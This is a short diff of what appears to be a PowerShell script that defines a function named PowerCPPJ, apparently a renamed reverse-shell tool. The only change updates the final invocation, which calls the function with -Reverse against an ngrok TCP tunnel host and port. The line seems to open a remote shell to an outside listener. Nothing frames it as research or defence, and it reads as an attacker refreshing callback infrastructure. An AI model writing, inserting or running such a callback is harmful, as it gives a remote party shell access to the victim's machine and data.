@@ -88,4 +88,4 @@ function PowerCPPJ
     }
 }
 
-PowerCPPJ -Reverse -IPAddress 6.tcp.ngrok.io -Port 13191
+PowerCPPJ -Reverse -IPAddress 2.tcp.ngrok.io -Port 18480
